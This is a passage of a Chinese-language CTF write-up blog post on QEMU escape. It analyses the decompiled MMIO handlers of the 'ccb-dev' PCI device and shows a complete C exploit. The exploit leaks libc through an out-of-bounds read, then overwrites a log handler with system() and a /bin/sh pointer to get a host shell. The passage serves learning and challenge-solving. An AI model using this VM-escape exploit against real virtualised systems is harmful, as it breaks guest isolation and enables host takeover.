class="string">&quot;ccb_dev-mmio&quot;</span>,</span><br><span class="line">    <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>(pci_dev, <span class="number">0</span>, <span class="number">0</span>, &amp;ds_0-&gt;mmio);</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;buffer));</span><br><span class="line">  ds_0-&gt;index = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_arg = <span class="number">0LL</span>;</span><br><span class="line">  ds_0-&gt;status = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_fd = <span class="number">2LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;log_format, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;log_format));</span><br><span class="line">  ds_0-&gt;log_handler = (LogHandlerFunc)&amp;dprintf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>MMIO 初始化</strong>：  <ul>
<li>设备通过 <code>MMIO</code> 与 <code>Guest</code> 交互，大小为 <code>2KB</code>，操作由 <code>ccb_dev_mmio_ops</code> 实现。</li>
<li>需确保 <code>ccb_dev_mmio_ops</code> 已定义（如 <code>read/write</code> 回调）。</li>
</ul>
</li>
<li><strong>PCI BAR 注册</strong>：  <ul>
<li><code>Guest</code> 访问 <code>PCI BAR 0</code> 时，会映射到设备的 <code>MMIO</code> 区域。</li>
</ul>
</li>
<li><strong>设备状态初始化</strong>：  <ul>
<li>缓冲区、日志、状态寄存器等均被清零或设为默认值。</li>
</ul>
</li>
<li><strong>日志机制</strong>：  <ul>
<li>默认日志输出到 <code>stderr</code>，可通过修改 <code>log_fd</code> 和 <code>log_handler</code> 重定向。</li>
</ul>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> __cdecl <span class="title">ccb_dev_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> val; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">55</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_read&quot;</span>);</span><br><span class="line">  val = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      val = ds_0-&gt;index;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      val = ds_0-&gt;buffer[ds_0-&gt;index];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      val = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      val = ds_0-&gt;log_arg;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      val = ds_0-&gt;status;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会发现如果index域可控，那么就有个越界读取</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> vala; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  vala = val;</span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">85</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      ds_0-&gt;index = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      ds_0-&gt;buffer[ds_0-&gt;index] = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( ds_0-&gt;log_handler )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;<span class="built_in">log_handler</span>(ds_0-&gt;log_fd, ds_0-&gt;log_format, ds_0-&gt;log_arg);</span><br><span class="line">        ds_0-&gt;status = <span class="number">1074749</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;status = <span class="number">16388413</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      ds_0-&gt;log_arg = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      ds_0-&gt;log_fd = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现index可控，且有个越界写，在0xC选项中有个函数执行</p>
<p>那么思路就是：</p>
<p>覆盖log_handler为system，然后log_fd为&#x2F;bin&#x2F;sh的地址，就能实现qemu的逃逸，妙！！</p>
<p>而要与MMIO进行交互 就得通过<code>resource0</code></p>
<h4 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_system_offset 0x50d70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_dprintf_offset 0x60a10</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title">getMMIOBase</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = <span class="built_in">open</span>(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getMMIOBase</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem Resource0Base: %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x12</span>);<span class="comment">//set index-&gt;12=fprintf_high</span></span><br><span class="line">    <span class="type">uint32_t</span> index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_fprintf = <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line">    libc_fprintf=libc_fprintf&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    libc_fprintf += <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);<span class="comment">//dprintf</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="type">uint64_t</span> libcbase=libc_fprintf-libc_dprintf_offset;</span><br><span class="line">    <span class="type">uint64_t</span> system=libcbase+libc_system_offset;</span><br><span class="line">    <span class="type">uint64_t</span> bin_sh=libcbase+<span class="number">0x1d8678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libcbase: 0x%llx.\n&quot;</span>, libcbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] bin_sh: 0x%llx.\n&quot;</span>, bin_sh);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system: 0x%llx.\n&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x13</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(bin_sh&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(system&amp;<span class="number">0xffffffff</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0xc</span>,<span class="number">0xbeef</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里的wp是由<strong>youlin</strong>师傅写的，只做学习作用</p>
</blockquote>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>先用gdb加载这个qemu的符号表，然后再通过attach pid来附加上这个qemu进程</p>
<h4 id="偏移寻找"><a href="#偏移寻找" class="headerlink" title="偏移寻找"></a>偏移寻找</h4><p>本地qemu的偏移是通过本地的libc给的，会跟远程的不一样，因此要先在本地打通之后，再修改成远程给的docker的libc的偏移，最后就能成功getshell</p>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh:turning off NDELAY mode</span></span><br></pre></td></tr></table></figure>

<p>本地获得shell之后可能会遇到这种情况，youlin师傅说这可能是管道的冲突，但是远程是可以打通的</p>
<p>在 Guest 用户态 C 代码中对 <code>mmio_mem</code> 指针的操作，最终会触发 QEMU Host 进程中相应的设备模拟代码的执行</p>
<p>当你通过这个指针进行读写操作时：</p>
<ol>
<li>Guest OS 将<strong>虚拟地址转换为物理地址</strong>。</li>
<li>QEMU 拦截对这些特定物理地址的访问。</li>
<li>QEMU 调用其内部对应的设备模型 MMIO 处理函数（如 <code>ccb_dev_mmio_write</code> &#x2F; <code>read</code> 或针对该设备的其他特定函数），并将偏移量和（对于写入）数据传递给这些函数</li>
</ol>
<h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">timeout <span class="number">300</span> ./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">1</span>G \</span><br><span class="line">   	-initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz<span class="number">-5.0</span><span class="number">.5</span>-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure>

<p>删除timeout，可以发现漏洞应该在pipeline上</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io">s1nec-1o</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/">http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://s1nec-1o.github.io" target="_blank">S1nec-1o's B1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/qemu%E9%80%83%E9%80%B8/">qemu逃逸</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/" title="Android逆向之Wiki篇"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Android逆向之Wiki篇</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s1nec-1o</div><div class="author-info__description">万事胜意</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="http://github.com/s1nec-1o"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习iot pwn 欢迎广大师傅与我交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">qemu逃逸学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">qemu概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text">qemu中的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pci%E8%AE%BE%E5%A4%87%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.</span> <span class="toc-text">pci设备概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pci%E8%AE%BE%E5%A4%87inQemu"><span class="toc-number">1.4.</span> <span class="toc-text">pci设备inQemu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E4%B8%AD%E8%AE%BF%E9%97%AEI-O%E7%A9%BA%E9%97%B4"><span class="toc-number">1.5.</span> <span class="toc-text">qemu中访问I&#x2F;O空间</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEmmio"><span class="toc-number">1.5.1.</span> <span class="toc-text">访问mmio</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEpmio"><span class="toc-number">1.5.2.</span> <span class="toc-text">访问pmio</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QOM%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.6.</span> <span class="toc-text">QOM编程模型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-ccb-dev"><span class="toc-number">2.1.</span> <span class="toc-text">2025长城杯决赛  ccb-dev</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99exp"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">写exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E5%AF%BB%E6%89%BE"><span class="toc-number">2.1.0.4.</span> <span class="toc-text">偏移寻找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.0.5.</span> <span class="toc-text">问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pipeline"><span class="toc-number">2.2.</span> <span class="toc-text">pipeline</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/" title="Qemu逃逸初识">Qemu逃逸初识</a><time datetime="2025-05-04T06:09:27.000Z" title="发表于 2025-05-04 14:09:27">2025-05-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/" title="Android逆向之Wiki篇">Android逆向之Wiki篇</a><time datetime="2025-04-14T06:44:43.000Z" title="发表于 2025-04-14 14:44:43">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/06/%E4%B8%80%E4%BA%9BIoT%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="一些IoT漏洞复现">一些IoT漏洞复现</a><time datetime="2025-04-06T14:45:13.000Z" title="发表于 2025-04-06 22:45:13">2025-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/" title="android之hook入门">android之hook入门</a><time datetime="2025-03-28T12:10:45.000Z" title="发表于 2025-03-28 20:10:45">2025-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/" title="固件下的hook &amp; patch">固件下的hook &amp; patch</a><time datetime="2025-03-03T08:26:16.000Z" title="发表于 2025-03-03 16:26:16">2025-03-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By s1nec-1o</div><div class="footer_custom_text">介是s1nec-1o的博客</div></div></footer></div><div 